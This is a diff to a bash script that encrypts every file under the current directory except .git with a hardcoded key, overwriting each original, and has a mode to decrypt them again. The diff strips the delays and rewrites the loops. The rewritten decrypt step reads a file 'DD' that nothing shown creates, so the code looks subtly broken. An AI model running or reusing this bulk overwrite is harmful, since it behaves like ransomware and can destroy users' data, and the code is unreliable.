@@ -14,7 +14,6 @@ if [ $mode = '1' ]
 then
     echo "==================================================="
     echo "============== GATHERING INFORMATION =============="
-    sleep 1
     files=`find . -path ./.git -prune -false -o -type f`
     files=($(echo $files | tr '\b' '\n'))
     echo $files
@@ -27,11 +26,11 @@ then
             continue
         fi
         echo ${files[counter]}
-        data=`xxd ${files[counter]} > HD`
-        encData=`./AES.py 'QVZBTEFOQ0hFUg==' "HD" 1`
-        echo $encData > ${files[counter]}
-        echo -e `rm HD`
-        sleep 1
+        `xxd ${files[counter]} > HD`
+        `./AES.py 'QVZBTEFOQ0hFUg==' "HD" 1`
+        `rm ${files[counter]}`
+        `cat HD > ${files[counter]}`
+        `rm HD`
     done
     echo "============= Encryption Successful ==============="
     echo "==================================================="
@@ -39,7 +38,6 @@ elif [ $mode = '2' ]
 then
     echo "==================================================="                   
     echo "============== GATHERING INFORMATION =============="
-    sleep 1
     files=`find . -path ./.git -prune -false -o -type f`                         
     files=($(echo $files | tr '\b' '\n'))                                        
     numOptions=${#files[@]}                                                             
@@ -51,10 +49,9 @@ then
             continue
         fi
         echo ${files[counter]}
-        decData=`./AES.py 'QVZBTEFOQ0hFUg==' "${files[counter]}" 2 > ED`
-        data=`xxd -r ED > ${files[counter]}`
-        echo -e `rm ED`
-        sleep 1
+        `./AES.py 'QVZBTEFOQ0hFUg==' "${files[counter]}" 2`
+        `xxd -r DD > ${files[counter]}`
+        `rm DD`
     done
     echo "============= Decryption Successful ==============="
     echo "==================================================="
